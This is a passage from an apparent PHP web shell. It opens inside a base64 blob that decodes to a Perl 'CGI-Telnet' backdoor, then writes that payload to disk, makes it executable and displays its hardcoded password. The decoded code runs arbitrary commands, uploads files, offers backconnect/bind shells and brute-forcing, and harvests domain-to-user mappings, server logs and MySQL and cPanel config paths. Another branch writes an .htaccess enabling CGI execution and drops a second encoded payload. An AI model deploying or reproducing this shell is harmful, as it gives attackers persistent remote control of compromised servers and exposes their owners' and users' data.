V07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAiJGZpbGUiOw0KCX0NCglyZXR1cm4gIjAiOw0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBUcmltU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cL1wvL1wvL2c7DQoJJHN0cmluZz1+IHMvXFxcXC9cXC9nOw0KCXJldHVybiAkc3RyaW5nOw0KfQ0Kc3ViIExpc3REaXINCnsNCglteSAkcGF0aCA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpci4kUGF0aFNlcCk7DQoJbXkgJHJlc3VsdCA9ICI8Zm9ybSBuYW1lPSdmJyBvblN1Ym1pdD1cIkVuY29kZXIoJ2QnKVwiIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPlBhdGg6IFsgIi4mQWRkTGlua0RpcigiZ3VpIikuIiBdIDwvc3Bhbj48aW5wdXQgdHlwZT0ndGV4dCcgaWQ9J2QnIG5hbWU9J2QnIHNpemU9JzQwJyB2YWx1ZT0nJEN1cnJlbnREaXInIC8+PGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYScgdmFsdWU9J2d1aSc+PGlucHV0IGNsYXNzPSdzdWJtaXQnIHR5cGU9J3N1Ym1pdCcgdmFsdWU9J0NoYW5nZSc+PC9mb3JtPiI7DQoJaWYoLWQgJHBhdGgpDQoJew0KCQlteSBAZm5hbWUgPSAoKTsNCgkJbXkgQGRuYW1lID0gKCk7DQoJCWlmKG9wZW5kaXIoRElSLCRwYXRoKSkNCgkJew0KCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCQl7DQoJCQkJJGY9JHBhdGguJGZpbGU7DQoJCQkJaWYoLWQgJGYpDQoJCQkJew0KCQkJCQlwdXNoKEBkbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCQljbG9zZWRpcihESVIpOw0KCQl9DQoJCUBmbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBmbmFtZTsNCgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOw0KCQkkcmVzdWx0IC49ICI8ZGl2Pjx0YWJsZSB3aWR0aD0nOTAlJyBjbGFzcz0nbGlzdGRpcic+DQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCB3aWR0aD0nMTAwJz5GaWxlIFNpemU8L3RoPg0KCQk8dGggd2lkdGg9JzE1MCc+T3duZXI8L3RoPg0KCQk8dGggd2lkdGg9JzEwMCc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCB3aWR0aD0nMTUwJz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHdpZHRoPScyMzAnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9Im5vdGxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJbmV4dDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdkaXInPjxhICBocmVmPSc/YT1ndWkmZD0iLiZFbmNvZGVEaXIoJGQpLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPjxhIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGRpcm5hbWUnLCciLiZBZGRTbGFzaGVzKCZBZGRTbGFzaGVzKCRkKSkuIicpOyByZXR1cm4gZmFsc2U7IFwiPlJlbmFtZTwvYT4gIHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZGlyOiAkZGlybmFtZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0iLiZFbmNvZGVEaXIoJHBhdGgpLiImcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQlteSAkYWN0aW9uID0gZW5jb2RlX2Jhc2U2NCgiZWRpdCAiLiRmaWxlKTsNCgkJCSR2aWV3ID0gIj9kaXI9Ii4kcGF0aC4iJnZpZXc9Ii4kZjsNCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdmaWxlJz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJmM9Ii4kYWN0aW9uLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPjxhIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJyk7IHJldHVybiBmYWxzZTtcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJnJlbW92ZT0kZmlsZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVHJ5IHRvIFZpZXcgTGlzdCBVc2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0RvbWFpblVzZXINCnsNCglvcGVuIChkMG1haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOw0KCW15IEBjbnpzID0gPGQwbWFpbnM+Ow0KCWNsb3NlIGQwbWFpbnM7DQoJbXkgJHN0eWxlPSJsaW5lIjsNCglteSAkcmVzdWx0PSI8aDM+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbWFpbiArIFVzZXI8L2ZvbnQ+PC9oMz4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGUgaWQ9ImRvbWFpbiI+PHRyPjx0aD5kMG1haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSB0cmltKCIvZXRjL3ZhbGlhc2VzLyIuJDEpOw0KCQkJJG93bmVyID0gZ2V0cHd1aWQoKHN0YXQoJGZpbGVuYW1lKSlbNF0pOw0KCQkJJHJlc3VsdCAuPSAnPHRyIHN0eWxlPSIkc3R5bGUiIHdpZHRoPTUwJT48dGQ+PGEgaHJlZj0iaHR0cDovLycuJDEuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJDEuJzwvYT48L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7DQoJfQ0KCW15ICRyZXN1bHQ9Ijx0YWJsZT48dHI+PHRoPlBhdGggTG9nPC90aD48dGg+U3VibWl0PC90aD48L3RyPiI7DQoJbXkgQHBhdGhsb2c9KAknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9hcGFjaGUyL2NvbmYvaHR0cGQuY29uZicsDQoJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCScvdmFyL2xvZy9odHRwZC9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2Vycm9yX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL3N1cGhwX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbGljZW5zZV9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbG9naW5fbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL3N0YXRzX2xvZycsDQoJCQknL3Zhci9jcGFuZWwvY3BhbmVsLmNvbmZpZycsDQoJCQknL3Vzci9sb2NhbC9waHAvbGliL3BocC5pbmknLA0KCQkJJy91c3IvbG9jYWwvcGhwNS9saWIvcGhwLmluaScsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtYmluLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwubG9nJywNCgkJCScvdmFyL2xvZy9teXNxbGRlcnJvci5sb2cnLA0KCQkJJy92YXIvbG9nL215c3FsL215c3FsLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtc2xvdy5sb2cnLA0KCQkJJy92YXIvbXlzcWwubG9nJywNCgkJCScvdmFyL2xpYi9teXNxbC9teS5jbmYnLA0KCQkJJy9ldGMvbXlzcWwvbXkuY25mJywNCgkJCScvZXRjL215LmNuZicsDQoJCQkpOw0KCW15ICRpPTA7DQoJbXkgJHBlcm1zOw0KCW15ICRzbDsNCglmb3JlYWNoIG15ICRsb2cgKEBwYXRobG9nKQ0KCXsNCgkJaWYoLXIgJGxvZykNCgkJew0KCQkJJHBlcm1zPSJPSyI7DQoJCX1lbHNlDQoJCXsNCgkJCSRwZXJtcz0iPGZvbnQgc3R5bGU9J2NvbG9yOiByZWQ7Jz5DYW5jZWw8Zm9udD4iOw0KCQl9DQoJCSRyZXN1bHQgLj08PEVORDsNCgkJPHRyPg0KDQoJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBvblN1Ym1pdD0iRW5jb2RlcignbG9nJGknKSI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIGlkPSJsb2ckaSIgbmFtZT0iYyIgdmFsdWU9InRhaWwgLTEwMDAwICRsb2cgfCBncmVwICcvaG9tZSciIHNpemU9JzUwJy8+PC90ZD4NCgkJCTx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciIgLz4NCgkJCTwvZm9ybT4NCgkJCTx0ZD4kcGVybXM8L3RkPg0KDQoJCTwvdHI+DQpFTkQNCgkJJGkrKzsNCgl9DQoJJHJlc3VsdCAuPSI8L3RhYmxlPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gZGVjb2RlX2Jhc2U2NCgkaW57J2MnfSk7DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KDQokQWN0aW9uID0gImNvbW1hbmQiIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKGRlY29kZV9iYXNlNjQodHJpbSgkaW57J2QnfSkpKTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob21wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcigiZCIpOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCRjaG1vZCBuZSAwKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJaWYoY2htb2QoJGNobW9kLCRmaWxlKSkNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCRyZW5hbWUgbmUgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfWVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjbGllbnRwb3J0Iik7DQoJcHJpbnQgJkJhY2tCaW5kOw0KfWVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7';
    $file = fopen('cgi4e.izo', 'w+');
    $write = fwrite($file, base64_decode($cgi4e));
    fclose($file);
    chmod('cgi4e.izo', 0755);
    echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>CGI-Telnet Version 1.4 </span><br><font face='Tahoma' color='#007700' size='2pt'>Password : d4rkj1n</font><center><br><iframe src=cgi4e/cgi4e.izo width=75% height=60% frameborder=0></iframe>
 
</div></center>";
}
///////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('config' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=config" method="post">

<?php
    echo '<center/><br/><b><font color=#428bca>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>';
    mkdir('config', 0755);
    chdir('config');
    $kokdosya = '.htaccess';
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die('Error cuyy!');
    $metin = 'Options FollowSymLinks MultiViews Indexes ExecCGI
		
AddType application/x-httpd-cgi .cpc

AddHandler cgi-script .izo
AddHandler cgi-script .izo';
    fwrite($dosya, $metin);
    fclose($dosya);
    $file = fopen('config.izo', 'w+');
    $write = fwrite($file, base64_decode($configshell));
    fclose($file);
    chmod('config.izo', 0755);
    echo '<iframe src=config/config.izo width=97% height=100% frameborder=0></iframe>
   </div>';
}
/////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('adfin' == $_GET['x'])) {
    ?>
